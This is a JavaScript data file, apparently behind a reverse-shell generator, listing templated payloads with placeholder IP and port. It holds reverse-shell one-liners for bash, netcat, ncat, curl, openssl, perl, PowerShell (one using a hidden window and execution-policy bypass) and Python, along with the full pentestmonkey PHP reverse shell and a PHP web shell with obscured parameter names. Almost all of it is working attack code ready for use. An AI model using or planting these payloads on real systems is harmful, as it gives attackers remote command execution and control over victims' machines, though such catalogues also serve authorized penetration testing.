const reverseShells = {
    "reverse_shell": {
        "bash": [
            {
                "title": "Bash reverse TCP shell (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `bash -i >& /dev/tcp/{ip}/{port} 0>&1`,
                "highlight": "language-bash",
                "shorttag": "Bash TCP Linux"
            },
            {
                "title": "Bash reverse TCP shell (Linux/Unix, Bash 4.0+)",
                "platform": "Linux/Unix, Bash 4.0+",
                "command": `0<&196;exec 196<>/dev/tcp/{ip}/{port};
bash <&196 >&196 2>&196`,
                "highlight": "language-bash",
                "shorttag": "Bash TCP 4.0+ Linux"
            },
            {
                "title": "Bash reverse TCP shell (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `exec 5<>/dev/tcp/{ip}/{port};
cat <&5 | while read line; do $line 2>&5 >&5; done`,
                "highlight": "language-bash",
                "shorttag": "Bash TCP 2 Linux"
            },
            {
                "title": "Bash reverse TCP shell (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5`,
                "highlight": "language-bash",
                "shorttag": "Bash TCP 3 Linux"
            },
            {
                "title": "Bash reverse UDP shell (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `bash -i >& /dev/udp/{ip}/{port} 0>&1`,
                "highlight": "language-bash",
                "shorttag": "Bash UDP Linux"
            },
            {
                "title": "Bash reverse TCP shell using mkfifo and nc (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `rm /tmp/f;
mkfifo /tmp/f;
cat /tmp/f | bash -i 2>&1 | nc {ip} {port} >/tmp/f`,
                "highlight": "language-bash",
                "shorttag": "Bash mkfifo Linux"
            }
        ],
        "netcat": [
            {
                "title": "Netcat reverse TCP shell (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `nc {ip} {port} -e bash`,
                "highlight": "language-bash",
                "shorttag": "Netcat TCP Linux"
            },
            {
                "title": "Netcat reverse TCP shell (Windows, nc.exe)",
                "platform": "Windows",
                "command": `nc.exe {ip} {port} -e bash`,
                "highlight": "language-bash",
                "shorttag": "Netcat TCP Windows"
            },
            {
                "title": "Netcat reverse TCP shell with -c option (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `nc -c bash {ip} {port}`,
                "highlight": "language-bash",
                "shorttag": "Netcat -c Linux"
            }
        ],
        "ncat": [
            {
                "title": "Ncat reverse TCP shell (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `ncat {ip} {port} -e bash`,
                "highlight": "language-bash",
                "shorttag": "Ncat TCP Linux"
            },
            {
                "title": "Ncat reverse TCP shell (Windows, ncat.exe)",
                "platform": "Windows",
                "command": `ncat.exe {ip} {port} -e bash`,
                "highlight": "language-bash",
                "shorttag": "Ncat TCP Windows"
            },
            {
                "title": "Bash reverse UDP shell using mkfifo and ncat (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `rm /tmp/f;
mkfifo /tmp/f;
cat /tmp/f | bash -i 2>&1 | ncat -u {ip} {port} >/tmp/f`,
                "highlight": "language-bash",
                "shorttag": "Ncat mkfifo Linux"
            }
        ],
        "curl": [
            {
                "title": "Reverse shell using curl (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `C='curl -Ns telnet://{ip}:{port}';
$C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null`,
                "highlight": "language-bash",
                "shorttag": "Curl Linux"
            }
        ],
        "openssl": [
            {
                "title": "Bash reverse shell using openssl (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `mkfifo /tmp/s;
bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s;
rm /tmp/s`,
                "highlight": "language-bash",
                "shorttag": "OpenSSL Linux"
            }
        ],
        "perl": [
            {
                "title": "Perl reverse TCP shell (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `perl -e 'use Socket;
$i="{ip}";$p={port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("bash -i");
};'`,
                "highlight": "language-perl",
                "shorttag": "Perl TCP Linux"
            },
            {
                "title": "Perl reverse TCP shell using IO::Socket::INET (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `perl -MIO -e '$p=fork;exit,if($p);
$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");
STDIN->fdopen($c,r);
$~->fdopen($c,w);
system$_ while<>'`,
                "highlight": "language-perl",
                "shorttag": "Perl IO Linux"
            }
        ],
        "php": [
            {
                "title": "PHP reverse shell - pentestmonkey - (Linux/Unix)",
                "platform": "Linux/Unix",
                "command": `<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';  // CHANGE THIS
$port = {port};       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
\t// Fork and have the parent process exit
\t$pid = pcntl_fork();
\t
\tif ($pid == -1) {
\t\tprintit("ERROR: Can't fork");
\t\texit(1);
\t}
\t
\tif ($pid) {
\t\texit(0);  // Parent exits
\t}

\t// Make the current process a session leader
\t// Will only succeed if we forked
\tif (posix_setsid() == -1) {
\t\tprintit("Error: Can't setsid()");
\t\texit(1);
\t}

\t$daemon = 1;
} else {
\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
\tprintit("$errstr ($errno)");
\texit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
\tprintit("ERROR: Can't spawn shell");
\texit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
\t// Check for end of TCP connection
\tif (feof($sock)) {
\t\tprintit("ERROR: Shell connection terminated");
\t\tbreak;
\t}

\t// Check for end of STDOUT
\tif (feof($pipes[1])) {
\t\tprintit("ERROR: Shell process terminated");
\t\tbreak;
\t}

\t// Wait until a command is end down $sock, or some
\t// command output is available on STDOUT or STDERR
\t$read_a = array($sock, $pipes[1], $pipes[2]);
\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

\t// If we can read from the TCP socket, send
\t// data to process's STDIN
\tif (in_array($sock, $read_a)) {
\t\tif ($debug) printit("SOCK READ");
\t\t$input = fread($sock, $chunk_size);
\t\tif ($debug) printit("SOCK: $input");
\t\tfwrite($pipes[0], $input);
\t}

\t// If we can read from the process's STDOUT
\t// send data down tcp connection
\tif (in_array($pipes[1], $read_a)) {
\t\tif ($debug) printit("STDOUT READ");
\t\t$input = fread($pipes[1], $chunk_size);
\t\tif ($debug) printit("STDOUT: $input");
\t\tfwrite($sock, $input);
\t}

\t// If we can read from the process's STDERR
\t// send data down tcp connection
\tif (in_array($pipes[2], $read_a)) {
\t\tif ($debug) printit("STDERR READ");
\t\t$input = fread($pipes[2], $chunk_size);
\t\tif ($debug) printit("STDERR: $input");
\t\tfwrite($sock, $input);
\t}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
\tif (!$daemon) {
\t\tprint "$string\\n";
\t}
}

?>`,
                "highlight": "language-php",
                "shorttag": "PHP reverse Linux"
            },
            {
                "title": "PHP web shell (Linux/Unix && Windows)",
                "platform": "Linux/Unix && Windows",
                "command": `<?php 
if (isset($_REQUEST['HYBY7F2D5Ak6gSr8Ng5o'])){ 
    echo "<pre>".shell_exec($_GET['HYBY7F2D5Ak6gSr8Ng5o'])."</pre>"; 
}; 
if (isset($_REQUEST['iqm9fi3UekCmw1c85ChG'])){ 
    echo "<pre>".system($_GET['iqm9fi3UekCmw1c85ChG'])."</pre>"; 
}; 
if (isset($_REQUEST['S1UhridAs756NB8qb8O1'])){ 
    echo "<pre>".passthru($_GET['S1UhridAs756NB8qb8O1'])."</pre>"; 
}; 
if (isset($_REQUEST['xhgjBfeXJ4Ue4glT2#zS'])){ 
    echo "<pre>".exec($_GET['xhgjBfeXJ4Ue4glT2#zS'])."</pre>"; 
}; 
?>`,
                "highlight": "language-php",
                "shorttag": "PHP web shell"
            }
        ],
        "powershell": [
            {
                "title": "PowerShell reverse TCP shell (Windows, PowerShell 2.0+)",
                "platform": "Windows, PowerShell 2.0+",
                "command": `$LHOST = "{ip}"; 
$LPORT = {port}; 
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
$NetworkStream = $TCPClient.GetStream(); 
$StreamReader = New-Object IO.StreamReader($NetworkStream);
$StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
$StreamWriter.AutoFlush = $true;
$Buffer = New-Object System.Byte[] 1024; 
while ($TCPClient.Connected) { 
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
    };
    if ($TCPClient.Connected -and $Code.Length -gt 1) { 
        $Output = try { Invoke-Expression ($Code) 2>&1 } 
        catch { $_ };
        $StreamWriter.Write("$Output\`n"); 
        $Code = $null 
    } 
};
$TCPClient.Close(); 
$NetworkStream.Close();
$StreamReader.Close(); 
$StreamWriter.Close()`,
                "highlight": "language-powershell",
                "shorttag": "PowerShell 2.0+ TCP"
            },
            {
                "title": "PowerShell reverse TCP shell (Windows, PowerShell 2.0+)",
                "platform": "Windows, PowerShell 2.0+",
                "command": `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$stream = $client.GetStream(); 
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()"`,
                "highlight": "language-powershell",
                "shorttag": "PowerShell 2.0+ nop"
            },
            {
                "title": "PowerShell reverse TCP shell (Windows, PowerShell 3.0+)",
                "platform": "Windows, PowerShell 3.0+",
                "command": `powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});
$NetworkStream = $TCPClient.GetStream(); 
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};
    $StreamWriter.Write($String + 'SHELL> ');
    $StreamWriter.Flush()
} 
WriteToStream '';
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    } 
    WriteToStream ($Output)
}
$StreamWriter.Close()"`,
                "highlight": "language-powershell",
                "shorttag": "PowerShell 3.0+"
            }
        ],
        "python": [
            {
                "title": "Python3 reverse TCP shell (Linux/Unix, Python 3.0+)",
                "platform": "Linux/Unix, Python 3.0+",
                "command": `export RHOST="{ip}";
export RPORT={port};
python3 -c 'import sys,socket,os,pty;
s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("bash")'`,
                "highlight": "language-python",
                "shorttag": "Python3 TCP Linux"
            },
            {
                "title": "Python3 reverse TCP shell (Linux/Unix, Python 3.0+)",
                "platform": "Linux/Unix, Python 3.0+",
                "command": `python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{ip}",{port}));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; 
pty.spawn("bash")'`,
                "highlight": "language-python",
                "shorttag": "Python3 TCP Unix"
            },
            {
                "title": "Python3 reverse TCP shell with threading (Windows/Linux/Unix, Python 3.0+)",
                "platform": "Windows/Linux/Unix, Python 3.0+",
                "command": `import os,socket,subprocess,threading;
def s2p(s, p): 
    while True: 
        data = s.recv(1024) 
        if len(data) > 0: 
            p.stdin.write(data) 
            p.stdin.flush()
def p2s(s, p): 
    while True: 
        s.send(p.stdout.read(1))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
p=subprocess.Popen(["bash"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True 
s2p_thread.start()
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True 
p2s_thread.start()
try: 
    p.wait() 
except KeyboardInterrupt: 
    s.close()`,
                "highlight": "language-python",
                "shorttag": "Python3 threading"
            },
            {
                "title": "Python3 reverse TCP shell (Linux/Unix, Python 3.0+)",
                "platform": "Linux/Unix, Python 3.0+",
                "command": `python3 -c 'import os,pty,socket;
s=socket.socket();
s.connect(("{ip}",{port}));
[os.dup2(s.fileno(),f)for f in(0,1,2)];
pty.spawn("bash")'`,
                "highlight": "language-python",
                "shorttag": "Python3 pty"
            }
        ]
    }
};

const bindShells = {};